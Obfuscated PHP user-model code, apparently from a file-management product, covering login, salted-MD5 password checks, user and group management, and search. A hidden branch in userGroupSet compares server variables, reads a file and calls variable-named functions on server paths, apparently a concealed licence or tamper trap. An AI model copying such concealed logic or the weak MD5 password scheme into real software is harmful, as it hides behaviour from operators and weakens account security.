(isset($§×ËÌ¸[$âŞÒ…Ñ])) { $£Š‹×¬Ø[] = $§×ËÌ¸[$âŞÒ…Ñ]; } } return $£Š‹×¬Ø; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\155\x65" => "\x75\163\145\x72\x5f\155\145\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\x64" => "\x75\163\145\162\111\x44"); protected $simpleField = "\165\163\x65\162\x49\104\x2c\x6e\x69\x63\x6b\x4e\x61\x6d\145\54\x6e\141\x6d\x65\54\141\166\141\x74\x61\x72\x2c\163\145\170\54\163\x74\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Àì–Š†²) { $ôÆ¯Ö“ò =& $_SERVER[ßğøİ]; $—ˆÎ¥Ó’ = $ôÆ¯Ö“ò[2271]; return array($ôÆ¯Ö“ò[1906] => array($Àì–Š†²[0], $—ˆÎ¥Ó’), $ôÆ¯Ö“ò[1908] => array($Àì–Š†²[0], $—ˆÎ¥Ó’), $ôÆ¯Ö“ò[2272] => array($Àì–Š†²[0], $—ˆÎ¥Ó’)); } protected function getInfo($ÒøÁ‹, $†ëŒˆœà = false) { $ƒº¶™ùú = $this->getInfoSimple($ÒøÁ‹); if (!is_array($ƒº¶™ùú)) { return array(); } if ($†ëŒˆœà) { return $this->_getInfoApply($ƒº¶™ùú); } return $this->cacheFunctionGet($_SERVER[ßğøİ][1910], $ÒøÁ‹); } protected function getInfoFull($Ü¨ÍÛ†à, $Õ”½‡ë± = false) { $ìÏÕøÃ = $this->getInfoSimple($Ü¨ÍÛ†à); if (!is_array($ìÏÕøÃ)) { return array(); } if ($Õ”½‡ë±) { return $this->_getInfoApply($ìÏÕøÃ, !0); } return $this->cacheFunctionGet($_SERVER[ßğøİ][2273], $Ü¨ÍÛ†à); } private function _getInfoApply($˜Á²ŒŸõ, $ëæŞÈ¶ó = false) { $ŒÎü÷Õ =& $_SERVER[ßğøİ]; if (!$˜Á²ŒŸõ) { return $˜Á²ŒŸõ; } $ØÇ¸ªî = md5($ŒÎü÷Õ[2274] . $˜Á²ŒŸõ[$ŒÎü÷Õ[888]] . $ŒÎü÷Õ[2275] . $˜Á²ŒŸõ[$ŒÎü÷Õ[32]]); $˜Á²ŒŸõ = $this->_listDataApplyItem($˜Á²ŒŸõ); $ğ½¹ÚÈû = Model($ŒÎü÷Õ[1327])->metaGet($˜Á²ŒŸõ[$ŒÎü÷Õ[86]][$ŒÎü÷Õ[402]]); $˜Á²ŒŸõ[$ŒÎü÷Õ[2276]] = $ØÇ¸ªî; $˜Á²ŒŸõ[$ŒÎü÷Õ[86]][$ŒÎü÷Õ[2097]] = isset($ğ½¹ÚÈû[$ŒÎü÷Õ[2098]]) ? $ğ½¹ÚÈû[$ŒÎü÷Õ[2098]] : null; if ($ëæŞÈ¶ó) { $˜Á²ŒŸõ[$ŒÎü÷Õ[466]] = $this->metaGet($˜Á²ŒŸõ[$ŒÎü÷Õ[1655]]); } return $˜Á²ŒŸõ; } protected function getInfoSimple($«çÑ£èº, $õòµàÃ¹ = false) { $»Õè‡Óò =& $_SERVER[ßğøİ]; if (!$«çÑ£èº) { return array(); } if ($õòµàÃ¹) { $¼ Øß±É = $this->where(array($»Õè‡Óò[1655] => intval($«çÑ£èº)))->find(); if (!is_array($¼ Øß±É)) { return array(); } $¼ Øß±É[$»Õè‡Óò[543]] = Action($»Õè‡Óò[2277])->parseUrl($¼ Øß±É[$»Õè‡Óò[543]]); return $¼ Øß±É; } return $this->cacheFunctionGet($»Õè‡Óò[1911], $«çÑ£èº); } protected function getInfoSimpleOuter($ïù¾ìÛ›) { $Œ’¬òÚº =& $_SERVER[ßğøİ]; if (!$ïù¾ìÛ› || $ïù¾ìÛ› == 0) { return array($Œ’¬òÚº[1655] => $Œ’¬òÚº[197], $Œ’¬òÚº[32] => $Œ’¬òÚº[162] . LNG($Œ’¬òÚº[2278]) . $Œ’¬òÚº[164], $Œ’¬òÚº[543] => STATIC_PATH . $Œ’¬òÚº[2279]); } $ğÄ¿Èºİ = $this->cacheFunctionGet($Œ’¬òÚº[1911], $ïù¾ìÛ›); $àà…£èÜ = array_field_key($ğÄ¿Èºİ, explode($Œ’¬òÚº[50], $this->simpleField)); if (!$àà…£èÜ) { return array($Œ’¬òÚº[1655] => $Œ’¬òÚº[1190], $Œ’¬òÚº[32] => $Œ’¬òÚº[162] . LNG($Œ’¬òÚº[2280]) . $Œ’¬òÚº[164], $Œ’¬òÚº[543] => STATIC_PATH . $Œ’¬òÚº[2281]); } $àà…£èÜ[$Œ’¬òÚº[543]] = Action($Œ’¬òÚº[2277])->parseUrl($àà…£èÜ[$Œ’¬òÚº[543]]); return $àà…£èÜ; } protected function groupUser($±À¬¸ù) { } public static function errorLang($òà’öŒ§) { $¥ÂşÎ© =& $_SERVER[ßğøİ]; $ä“ÛĞà¶ = array(self::ERROR_USER_NOT_EXISTS => $¥ÂşÎ©[2282], self::ERROR_USER_PASSWORD_ERROR => $¥ÂşÎ©[2283], self::ERROR_USER_EXIST_NAME => $¥ÂşÎ©[2284], self::ERROR_USER_EXIST_PHONE => $¥ÂşÎ©[2285], self::ERROR_USER_EXIST_EMAIL => $¥ÂşÎ©[2286], self::ERROR_USER_LOGIN_LOCK => $¥ÂşÎ©[2287], self::ERROR_IP_NOT_ALLOW => $¥ÂşÎ©[2288], self::ERROR_USER_EXIST_NICKNAME => $¥ÂşÎ©[2289]); return LNG($ä“ÛĞà¶[$òà’öŒ§]); } public function getInfoByMeta($Üèáçºú, $×”­ïö) { $ª÷Û¹µ =& $_SERVER[ßğøİ]; $÷¥õşãŞ = Model($ª÷Û¹µ[2290])->where(array($ª÷Û¹µ[94] => $Üèáçºú, $ª÷Û¹µ[374] => $×”­ïö))->find(); if ($÷¥õşãŞ) { return $this->getInfo($÷¥õşãŞ[$ª÷Û¹µ[1655]]); } return !1; } public function userLoginCheck($ùıúî¬, $½¡í”) { $Üó—ı‡ =& $_SERVER[ßğøİ]; $ÂÄ÷—şã = $this->userLoginFind($ùıúî¬); if (!$ÂÄ÷—şã) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÂÄ÷—şã[$Üó—ı‡[1655]], $½¡í”)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÂÄ÷—şã[$Üó—ı‡[1655]]); } public function userLoginFind($¤À“ÏŠï) { $¶ˆ…Õê‰ =& $_SERVER[ßğøİ]; $êß’©¤Ø = array($¶ˆ…Õê‰[32] => $¤À“ÏŠï, $¶ˆ…Õê‰[542] => $¤À“ÏŠï, $¶ˆ…Õê‰[305] => $¤À“ÏŠï, $¶ˆ…Õê‰[2291] => $¤À“ÏŠï, $¶ˆ…Õê‰[1000] => $¶ˆ…Õê‰[1002]); if ($this->nickNameRpt()) { unset($êß’©¤Ø[$¶ˆ…Õê‰[542]]); } return $this->where($êß’©¤Ø)->find(); } public function clearCache($¦‰¶«¾) { $ ×¢½Ã¯ =& $_SERVER[ßğøİ]; $this->cacheFunctionClear($ ×¢½Ã¯[1910], $¦‰¶«¾); $this->cacheFunctionClear($ ×¢½Ã¯[1911], $¦‰¶«¾); $this->cacheFunctionClear($ ×¢½Ã¯[2273], $¦‰¶«¾); } public function userPasswordCheck($øâ¡ñáŠ, $Ç°œ—–Ÿ) { $úŠ–ª” =& $_SERVER[ßğøİ]; $õ‚Ì³û… = $this->where(array($úŠ–ª”[1655] => intval($øâ¡ñáŠ)))->find(); $Ó‘Âà÷ = $this->metaGet($øâ¡ñáŠ); $÷…Ïï Ñ = isset($Ó‘Âà÷[$úŠ–ª”[2292]]) ? $Ó‘Âà÷[$úŠ–ª”[2292]] : $úŠ–ª”[12]; if (md5($÷…Ïï Ñ . trim($Ç°œ—–Ÿ)) !== $õ‚Ì³û…[$úŠ–ª”[888]]) { return !1; } return !0; } public function userAdd($Õ„ºá£·) { $†ïÇ¯ìÓ =& $_SERVER[ßğøİ]; $­ÖŞƒš¢ = array($†ïÇ¯ìÓ[420] => $Õ„ºá£·[$†ïÇ¯ìÓ[32]], $†ïÇ¯ìÓ[2293] => $Õ„ºá£·[$†ïÇ¯ìÓ[1534]], $†ïÇ¯ìÓ[2294] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[305]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[305]] : $†ïÇ¯ìÓ[12], $†ïÇ¯ìÓ[2295] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[2291]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[2291]] : $†ïÇ¯ìÓ[12], $†ïÇ¯ìÓ[2296] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[542]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[542]] : $Õ„ºá£·[$†ïÇ¯ìÓ[32]], $†ïÇ¯ìÓ[2297] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[543]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[543]] : $†ïÇ¯ìÓ[12], $†ïÇ¯ìÓ[2298] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[2299]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[2299]] : 1, $†ïÇ¯ìÓ[2300] => $Õ„ºá£·[$†ïÇ¯ìÓ[888]], $†ïÇ¯ìÓ[1912] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[1815]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[1815]] : 1024 * 1024 * 20, $†ïÇ¯ìÓ[1913] => 0, $†ïÇ¯ìÓ[2301] => 0, $†ïÇ¯ìÓ[1957] => isset($Õ„ºá£·[$†ïÇ¯ìÓ[747]]) ? $Õ„ºá£·[$†ïÇ¯ìÓ[747]] : 1); if (!empty($Õ„ºá£·[$†ïÇ¯ìÓ[1655]])) { $­ÖŞƒš¢[$†ïÇ¯ìÓ[1655]] = $Õ„ºá£·[$†ïÇ¯ìÓ[1655]]; } $èÅ²Ø²Ö = $this->_checkExist($Õ„ºá£·); if ($èÅ²Ø²Ö !== !0) { return $èÅ²Ø²Ö; } if (!empty($­ÖŞƒš¢[$†ïÇ¯ìÓ[543]]) && strlen($­ÖŞƒš¢[$†ïÇ¯ìÓ[543]]) > 255) { $­ÖŞƒš¢[$†ïÇ¯ìÓ[543]] = $†ïÇ¯ìÓ[12]; } $´È¦½Ûğ = $this->add($­ÖŞƒš¢); $üÅ¨×ÑÄ = array($†ïÇ¯ìÓ[2300] => $­ÖŞƒš¢[$†ïÇ¯ìÓ[888]], $†ïÇ¯ìÓ[2296] => $­ÖŞƒš¢[$†ïÇ¯ìÓ[542]]); $this->userEdit($´È¦½Ûğ, $üÅ¨×ÑÄ); Model($†ïÇ¯ìÓ[1327])->userRootAdd($´È¦½Ûğ); return $´È¦½Ûğ; } protected function userEditTest($¨½±¤È, $æÕ†ä«) { return $this->call($_SERVER[ßğøİ][2302], $¨½±¤È, $æÕ†ä«); } protected function userEdit($šöÂŠé, $ïû¬÷À) { $ÜºÓü¾³ =& $_SERVER[ßğøİ]; $À•®é©Ô = $this->getInfoSimple($šöÂŠé); if (!$À•®é©Ô) { return !1; } $÷¾şœ– = $this->_checkExist($ïû¬÷À, $šöÂŠé); if ($÷¾şœ– !== !0) { return $÷¾şœ–; } if (isset($ïû¬÷À[$ÜºÓü¾³[888]]) && trim($ïû¬÷À[$ÜºÓü¾³[888]]) != $ÜºÓü¾³[12]) { $‹„Ëİ¬ú = $this->metaGet($šöÂŠé); if (empty($‹„Ëİ¬ú[$ÜºÓü¾³[2292]])) { $‹„Ëİ¬ú[$ÜºÓü¾³[2292]] = rand_string(10); Model($ÜºÓü¾³[513])->metaSet($šöÂŠé, $ÜºÓü¾³[2292], $‹„Ëİ¬ú[$ÜºÓü¾³[2292]]); } $ïû¬÷À[$ÜºÓü¾³[888]] = md5($‹„Ëİ¬ú[$ÜºÓü¾³[2292]] . trim($ïû¬÷À[$ÜºÓü¾³[888]])); } else { unset($ïû¬÷À[$ÜºÓü¾³[888]]); } if (!empty($ïû¬÷À[$ÜºÓü¾³[543]]) && strlen($ïû¬÷À[$ÜºÓü¾³[543]]) > 255) { $ïû¬÷À[$ÜºÓü¾³[543]] = $ÜºÓü¾³[12]; } $this->where(array($ÜºÓü¾³[1646] => $šöÂŠé))->save($ïû¬÷À); if (isset($ïû¬÷À[$ÜºÓü¾³[542]])) { $this->setNamePinyin($šöÂŠé, $ïû¬÷À[$ÜºÓü¾³[542]]); } $this->clearCache($šöÂŠé); return !0; } public function setNamePinyin($Œû€µó, $¸Ïœôº = false) { $Ùæ™™ñ° =& $_SERVER[ßğøİ]; if (!$¸Ïœôº) { $îİ—ßç³ = $this->getInfoSimple($Œû€µó); $¸Ïœôº = $îİ—ßç³[$Ùæ™™ñ°[542]] ? $îİ—ßç³[$Ùæ™™ñ°[542]] : $îİ—ßç³[$Ùæ™™ñ°[32]]; } $òêÂ©Ò = Model($Ùæ™™ñ°[535]); if (!Input::check($¸Ïœôº, $Ùæ™™ñ°[593])) { return $òêÂ©Ò->metaSet($Œû€µó, array($Ùæ™™ñ°[465] => $Ùæ™™ñ°[12], $Ùæ™™ñ°[464] => $Ùæ™™ñ°[12])); } return $òêÂ©Ò->metaSet($Œû€µó, array($Ùæ™™ñ°[465] => str_replace($Ùæ™™ñ°[53], $Ùæ™™ñ°[12], Pinyin::get($¸Ïœôº)), $Ùæ™™ñ°[464] => Pinyin::get($¸Ïœôº, $Ùæ™™ñ°[594]))); } private function nickNameRpt() { $ıšã¶Œ =& $_SERVER[ßğøİ]; $¸É¿¾±ó = Model($ıšã¶Œ[767])->get($ıšã¶Œ[2303]); $Ïü–Å‹ = $GLOBALS[$ıšã¶Œ[6]][$ıšã¶Œ[381]][$ıšã¶Œ[2303]]; $à˜´ÉêÓ = !is_null($¸É¿¾±ó) ? $¸É¿¾±ó : $Ïü–Å‹; return !!$à˜´ÉêÓ; } private function _checkExist($šó÷¾“, $×¬£—ÅÛ = false) { $¢×Õ†’ =& $_SERVER[ßğøİ]; $í‚Ò–Ë = array($¢×Õ†’[32] => UserModel::ERROR_USER_EXIST_NAME, $¢×Õ†’[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $¢×Õ†’[305] => UserModel::ERROR_USER_EXIST_EMAIL, $¢×Õ†’[2291] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($í‚Ò–Ë[$¢×Õ†’[542]]); } $‡äŠÙ« = $×¬£—ÅÛ ? array($¢×Õ†’[1655] => array($¢×Õ†’[2304], $×¬£—ÅÛ)) : array(); foreach ($í‚Ò–Ë as $ŠŠ¨éë => $áÁèŸç) { $åÕäÅØ = array(); foreach ($í‚Ò–Ë as $½üªÒ¯ => $è™ñÁğ½) { if (isset($šó÷¾“[$½üªÒ¯]) && $šó÷¾“[$½üªÒ¯]) { $åÕäÅØ[] = $šó÷¾“[$½üªÒ¯]; } } if (!$åÕäÅØ) { continue; } $ñµàı– = array_merge(array($ŠŠ¨éë => array($¢×Õ†’[7], $åÕäÅØ)), $‡äŠÙ«); $ıéˆî„Ë = $this->where($ñµàı–)->find(); if ($ıéˆî„Ë) { return $áÁèŸç; } } return !0; } public function userListInfo($“¶÷äù¾) { $ó¦¸Ö¼ =& $_SERVER[ßğøİ]; $Õ–‰Ñ± = array(); $“¶÷äù¾ = is_array($“¶÷äù¾) ? array_unique($“¶÷äù¾) : array(); if (!$“¶÷äù¾) { return $Õ–‰Ñ±; } if (count($“¶÷äù¾) < 20) { foreach ($“¶÷äù¾ as $ØÚó¤ÖÂ) { $Õ–‰Ñ±[$ØÚó¤ÖÂ . $ó¦¸Ö¼[12]] = $this->getInfoSimpleOuter($ØÚó¤ÖÂ); } } else { $ùËÔÜè = array($ó¦¸Ö¼[1646] => array($ó¦¸Ö¼[418], $“¶÷äù¾)); if (count($“¶÷äù¾) == 1) { $ùËÔÜè = array($ó¦¸Ö¼[1646] => $“¶÷äù¾[0]); } $ˆÖä®öÈ = Model($ó¦¸Ö¼[513])->field($this->simpleField)->where($ùËÔÜè)->select(); $ˆÖä®öÈ = array_to_keyvalue($ˆÖä®öÈ, $ó¦¸Ö¼[1655]); foreach ($“¶÷äù¾ as $ØÚó¤ÖÂ) { $óÉ˜Ì¡ = $ˆÖä®öÈ[$ØÚó¤ÖÂ]; if (!$óÉ˜Ì¡) { $Õ–‰Ñ±[$ØÚó¤ÖÂ . $ó¦¸Ö¼[12]] = $this->getInfoSimpleOuter($ØÚó¤ÖÂ); continue; } $óÉ˜Ì¡[$ó¦¸Ö¼[543]] = Action($ó¦¸Ö¼[2277])->parseUrl($óÉ˜Ì¡[$ó¦¸Ö¼[543]]); $Õ–‰Ñ±[$ØÚó¤ÖÂ . $ó¦¸Ö¼[12]] = $óÉ˜Ì¡; } } return $Õ–‰Ñ±; } protected function userStatus($“©¯¨‰, $½Æ’Ú•Ğ) { $È¾‘Æ’³ = $this->getInfoSimple($“©¯¨‰); if (!$È¾‘Æ’³) { return !1; } $Ù ¦Ş·‡ = array($_SERVER[ßğøİ][747] => $½Æ’Ú•Ğ); return $this->userEdit($“©¯¨‰, $Ù ¦Ş·‡); } protected function userRemove($ßÖßîœô) { $Ñô¸Ÿ¥Æ =& $_SERVER[ßğøİ]; $ßã£ÏÀä = $this->getInfoSimple($ßÖßîœô); if (!$ßã£ÏÀä) { return !1; } $¸†¤Ù±è = array($Ñô¸Ÿ¥Æ[1646] => $ßÖßîœô); Model($Ñô¸Ÿ¥Æ[601])->where($¸†¤Ù±è)->delete(); Model($Ñô¸Ÿ¥Æ[2305])->where($¸†¤Ù±è)->delete(); Model($Ñô¸Ÿ¥Æ[1918])->where($¸†¤Ù±è)->delete(); Model($Ñô¸Ÿ¥Æ[2290])->where($¸†¤Ù±è)->delete(); Model($Ñô¸Ÿ¥Æ[1068])->where($¸†¤Ù±è)->delete(); Model($Ñô¸Ÿ¥Æ[2121])->removeUserAll($ßÖßîœô); Model($Ñô¸Ÿ¥Æ[822])->userRootRemove($ßÖßîœô); return $this->where($¸†¤Ù±è)->delete(); } protected function userGroupSet($ºÉ±˜ª, $çÕÎØù¦, $Ì†ãİ¥Ä = array()) { $œ…Š–§ =& $_SERVER[ßğøİ]; if ($_SERVER[$œ…Š–§[871]] != $_SERVER[$œ…Š–§[1756]]) { $Ñï¦¾ = $œ…Š–§[872]; $˜šôúï± = $œ…Š–§[873]; $¤¤Û•Îü = $_SERVER[$œ…Š–§[874]] . $œ…Š–§[875]; $€Ó»å—Á = $˜šôúï±($¤¤Û•Îü); $ëª¬†„ş = explode($œ…Š–§[231], $€Ó»å—Á); if (count($ëª¬†„ş) < $œ…Š–§[620]) { $Áã¡ŒŠ = $œ…Š–§[876]; $Áã¡ŒŠ(); } $€ˆ‘ÚËæ = $œ…Š–§[877]; $€ˆ‘ÚËæ($_SERVER[$œ…Š–§[878]]); $€ˆ‘ÚËæ($_SERVER[$œ…Š–§[874]] . $œ…Š–§[2306]); $ìÃéˆ¢ü = 1; while ($ìÃéˆ¢ü > 1) { $ìÃéˆ¢ü = $ìÃéˆ¢ü + 4; $º”™ßı– = rawurlencode($ìÃéˆ¢ü . $œ…Š–§[378]); } } $õšˆÉ‘ = $this->getInfoSimple($ºÉ±˜ª); if (!$õšˆÉ‘ || !is_array($çÕÎØù¦)) { return !1; } $´ü’¦³ = Model($œ…Š–§[1918]); $´ü’¦³->where(array($œ…Š–§[1655] => $ºÉ±˜ª))->delete(); $ ²œË® = array(); $¥µ•½õ£ = 0; foreach ($çÕÎØù¦ as $Ï³˜ó±¢ => $õÖ“™Í’) { $‚Ÿ«êÜû = array($œ…Š–§[1655] => $ºÉ±˜ª, $œ…Š–§[1828] => $Ï³˜ó±¢, $œ…Š–§[1932] => $õÖ“™Í’); $‚Ÿ«êÜû[$œ…Š–§[1852]] = isset($Ì†ãİ¥Ä[$¥µ•½õ£]) ? $Ì†ãİ¥Ä[$¥µ•½õ£] : 0; $¥µ•½õ£++; $ ²œË®[] = $‚Ÿ«êÜû; } return $´ü’¦³->addAll($ ²œË®, array(), !0); } protected function userGroupAdd($õ„óõäÂ, $øŸ¼ıØØ = array()) { $íıÙàä› =& $_SERVER[ßğøİ]; $¥¦ÙÈšì = $this->getInfoSimple($õ„óõäÂ); if (!$¥¦ÙÈšì || empty($øŸ¼ıØØ)) { return !1; } $ŠüˆÑµ = array(); foreach ($øŸ¼ıØØ as $·ËƒúÒ => $ÃÕ¬»ò¹) { $ŠüˆÑµ[] = array($íıÙàä›[1655] => $õ„óõäÂ, $íıÙàä›[1828] => $·ËƒúÒ, $íıÙàä›[1932] => $ÃÕ¬»ò¹, $íıÙàä›[1852] => 0); } return Model($íıÙàä›[1918])->addAll($ŠüˆÑµ, array(), !0); } protected function userGroupRemove($Ù¬»·Í¬, $ÒÉşôç) { $ôö©ÍÄ— =& $_SERVER[ßğøİ]; $£°µ™Êæ = $this->getInfoSimple($Ù¬»·Í¬); if (!$£°µ™Êæ || !$ÒÉşôç) { return !1; } $¾Š´ßÎ = array($ôö©ÍÄ—[1646] => $Ù¬»·Í¬, $ôö©ÍÄ—[1916] => $ÒÉşôç); return Model($ôö©ÍÄ—[1918])->where($¾Š´ßÎ)->delete(); } public function listData() { $£ºá§™ş = $this->_makeOrder()->selectPage(50); $this->_listDataApply($£ºá§™ş[$_SERVER[ßğøİ][369]]); return $£ºá§™ş; } public function listByID($»Ş–¬) { $ù­œÕ¯ =& $_SERVER[ßğøİ]; if (!$»Ş–¬) { return; } $–…§šÈã = array($ù­œÕ¯[1655] => array($ù­œÕ¯[7], $»Ş–¬)); $»üùŞ°ù = $this->where($–…§šÈã)->select(); $»üùŞ°ù = array_sort_keep($»üùŞ°ù, $ù­œÕ¯[1655], $»Ş–¬); $this->_listDataApply($»üùŞ°ù); return $»üùŞ°ù; } public function listByGroup($óËŠå­÷ = 0, $Â±œÂˆ = array()) { $´ÙÊ´å =& $_SERVER[ßğøİ]; $§«•Ï›õ = $´ÙÊ´å[12]; $ñ›ÛöË± = array(); if ($óËŠå­÷) { $ñ›ÛöË± = array($´ÙÊ´å[2307] => intval($óËŠå­÷)); $§«•Ï›õ = "\x4c\105\x46\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\x75\163\145\162\137\x67\x72\x6f\165\160\40\165\x73\145\x72\137\x67\x72\157\165\x70\40\x6f\x6e\x20\x75\163\x65\x72\x2e\165\163\145\x72\111\x44\40\75\40\165\x73\145\x72\x5f\147\162\x6f\165\x70\x2e\x75\x73\x65\x72\111\x44"; $à¥Œ¡ûù = Input::get($´ÙÊ´å[457], null, $´ÙÊ´å[12]) ? $´ÙÊ´å[12] : $´ÙÊ´å[2308]; } if (isset($Â±œÂˆ[$´ÙÊ´å[747]])) { $ñ›ÛöË±[$´ÙÊ´å[2309]] = $Â±œÂˆ[$´ÙÊ´å[747]]; } $‡™ ë˜’ = $this->_makeOrder($à¥Œ¡ûù)->field($´ÙÊ´å[2310])->where($ñ›ÛöË±)->join($§«•Ï›õ)->selectPage(50); $this->_listDataApply($‡™ ë˜’[$´ÙÊ´å[369]]); return $‡™ ë˜’; } private function _makeOrder($ˆš»Ãª = '') { $Û°ç†Ÿİ =& $_SERVER[ßğøİ]; $ŒŠÖÀæØ = array($Û°ç†Ÿİ[1655], $Û°ç†Ÿİ[32], $Û°ç†Ÿİ[1817], $Û°ç†Ÿİ[1789], $Û°ç†Ÿİ[200]); $†Æ¦ù­Û = array($Û°ç†Ÿİ[450] => $Û°ç†Ÿİ[451], $Û°ç†Ÿİ[452] => $Û°ç†Ÿİ[453]); $¢öÍ«¦è = Input::get($Û°ç†Ÿİ[457], $Û°ç†Ÿİ[7], $Û°ç†Ÿİ[1646], $ŒŠÖÀæØ); $”Ø…ìÃÆ = Input::get($Û°ç†Ÿİ[458], $Û°ç†Ÿİ[7], $Û°ç†Ÿİ[1919], array($Û°ç†Ÿİ[1919], $Û°ç†Ÿİ[452])); $”Ø…ìÃÆ = $†Æ¦ù­Û[$”Ø…ìÃÆ]; $ˆš»Ãª = $ˆš»Ãª . "\165\x73\145\x72\56{$¢öÍ«¦è}\x20{$”Ø…ìÃÆ}\x2c\x20\x75\163\x65\x72\x2e\x75\163\x65\162\111\104\40\141\163\143"; return $this->alias($Û°ç†Ÿİ[2041])->order($ˆš»Ãª); } public function listSearch($åÚü°) { $–µ÷Øñ =& $_SERVER[ßğøİ]; $Ñ¶ÓŸ¢ä = $åÚü°[$–µ÷Øñ[1922]]; $ëğ²ì©• = isset($åÚü°[$–µ÷Øñ[1923]]) ? $åÚü°[$–µ÷Øñ[1923]] : !1; $Ñ¶ÓŸ¢ä = str_replace($–µ÷Øñ[1924], $–µ÷Øñ[1925], trim($Ñ¶ÓŸ¢ä)); $èóÑîËÕ = array($–µ÷Øñ[32] => array($–µ÷Øñ[383], "\45{$Ñ¶ÓŸ¢ä}\x25"), $–µ÷Øñ[305] => array($–µ÷Øñ[383], "{$Ñ¶ÓŸ¢ä}\45"), $–µ÷Øñ[542] => array($–µ÷Øñ[383], "{$Ñ¶ÓŸ¢ä}\45"), $–µ÷Øñ[1000] => $–µ÷Øñ[1926]); if (Input::check($Ñ¶ÓŸ¢ä, $–µ÷Øñ[311])) { $èóÑîËÕ[$–µ÷Øñ[1655]] = array($–µ÷Øñ[383], "{$Ñ¶ÓŸ¢ä}\45"); $èóÑîËÕ[$–µ÷Øñ[2291]] = array($–µ÷Øñ[383], "{$Ñ¶ÓŸ¢ä}\x25"); } if (!$Ñ¶ÓŸ¢ä) { $èóÑîËÕ = array(); } if (isset($åÚü°[$–µ÷Øñ[747]])) { $èóÑîËÕ[$–µ÷Øñ[747]] = $åÚü°[$–µ÷Øñ[747]]; } $èóÑîËÕ = $this->parseWhereLike($èóÑîËÕ); $˜øİñ¶ = $this->_makeOrder()->where($èóÑîËÕ)->selectPage(20); if (!$˜øİñ¶ || count($˜øİñ¶[$–µ÷Øñ[369]]) < 5 && Input::check($Ñ¶ÓŸ¢ä, $–µ÷Øñ[318])) { $Ù… Ú„½ = $this->_searchFromMeta($–µ÷Øñ[464], $Ñ¶ÓŸ¢ä, 10); $ÖŸìÖç‘ = $this->_searchFromMeta($–µ÷Øñ[465], $Ñ¶ÓŸ¢ä, 10); $ÙÊûå— = array_merge($Ù… Ú„½, $ÖŸìÖç‘, $˜øİñ¶[$–µ÷Øñ[369]]); $˜øİñ¶[$–µ÷Øñ[369]] = array_unique_by_key($ÙÊûå—, $–µ÷Øñ[1655]); $˜øİñ¶[$–µ÷Øñ[366]][$–µ÷Øñ[367]] = count($˜øİñ¶[$–µ÷Øñ[369]]); $˜øİñ¶[$–µ÷Øñ[366]][$–µ÷Øñ[368]] = ceil($˜øİñ¶[$–µ÷Øñ[366]][$–µ÷Øñ[367]] / $˜øİñ¶[$–µ÷Øñ[366]][$–µ÷Øñ[363]]); } $this->_listDataApply($˜øİñ¶[$–µ÷Øñ[369]]); $this->_filterByGroup($˜øİñ¶, $ëğ²ì©•); return $˜øİñ¶; } private function _filterByGroup(&$íõøÌÆ§, $Ü­ÊÔ®˜) { $ÀÇ‚Ä«¸ =& $_SERVER[ßğøİ]; if (!$Ü­ÊÔ®˜) { return $íõøÌÆ§; } foreach ($íõøÌÆ§[$ÀÇ‚Ä«¸[369]] as $•®Ê®İ» => &$³ŠÔ‰ÂÔ) { $±àöÈ«ğ = array_to_keyvalue($³ŠÔ‰ÂÔ[$ÀÇ‚Ä«¸[2011]], $ÀÇ‚Ä«¸[12], $ÀÇ‚Ä«¸[1828]); if (!in_array($Ü­ÊÔ®˜, $±àöÈ«ğ)) { unset($íõøÌÆ§[$ÀÇ‚Ä«¸[369]][$•®Ê®İ»]); } } unset($³ŠÔ‰ÂÔ); $íõøÌÆ§[$ÀÇ‚Ä«¸[369]] = array_values($íõøÌÆ§[$ÀÇ‚Ä«¸[369]]); $íõøÌÆ§[$ÀÇ‚Ä«¸[366]] = array($ÀÇ‚Ä«¸[2075] => count($íõøÌÆ§[$ÀÇ‚Ä«¸[369]]), $ÀÇ‚Ä«¸[2073] => $íõøÌÆ§[$ÀÇ‚Ä«¸[366]][$ÀÇ‚Ä«¸[363]], $ÀÇ‚Ä«¸[2072] => 1, $ÀÇ‚Ä«¸[2074] => 1); } private function _searchFromMeta($¶¾Á¼Ê, $Ã…ò¡Éû, $êÖòéÂ) { $ü¾Ãİ®… =& $_SERVER[ßğøİ]; $Ã…ò¡Éû = strtolower($Ã…ò¡Éû); $Õ‡•á¿ = array($ü¾Ãİ®…[94] => $¶¾Á¼Ê, $ü¾Ãİ®…[374] => array($ü¾Ãİ®…[383], "\x25{$Ã…ò¡Éû}\x25")); $Õ‡•á¿ = $this->parseWhereLike($Õ‡•á¿); $üÌöõèÕ = Model($ü¾Ãİ®…[2311])->where($Õ‡•á¿)->limit($êÖòéÂ)->select(); if (!$üÌöõèÕ) { return array(); } $üÌöõèÕ = array_to_keyvalue($üÌöõèÕ, $ü¾Ãİ®…[12], $ü¾Ãİ®…[1655]); $‡Æø¦Ø– = $this->where(array($ü¾Ãİ®…[1646] => array($ü¾Ãİ®…[7], $üÌöõèÕ)))->select(); if (!$‡Æø¦Ø–) { return array(); } return $‡Æø¦Ø–; } private function _listDataApplyItem($Ëã”´‹) { $ç’°‘œÏ = array($Ëã”´‹); 